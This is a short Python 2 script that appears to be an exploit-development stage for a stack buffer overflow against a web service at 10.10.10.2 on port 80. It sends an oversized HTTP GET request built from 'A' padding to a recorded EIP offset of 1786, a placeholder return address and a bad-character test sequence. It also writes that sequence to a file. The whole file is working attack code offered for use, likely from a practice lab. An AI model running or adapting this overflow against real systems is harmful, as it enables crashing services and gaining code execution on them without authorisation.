#!/usr/bin/env python2

import requests
import socket

RHOST = "10.10.10.2"
RPORT = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# appears to break at 5000

# offsets
# EIP 1786
# ESP 1790
# EBX 1782

eip_offset = 1786
buf_len = 5000

badchars = [0x00, 0x0A, 0x0D]
badchar_test = ""


for i in range(0x00, 0xFF + 1):
    if i not in badchars:
        badchar_test += chr(i)

with open("badchar_test.bin", "wb") as f:
    f.write(badchar_test)

padding = "A" * eip_offset
eip = "BBBB"
shellcode = badchar_test
esp_content = "C" * (buf_len - len(padding) - len(eip) - len(shellcode))

buf = padding + eip + shellcode + esp_content
s.send("GET /" + buf + " HTTP/1.1\r\n\r\n")

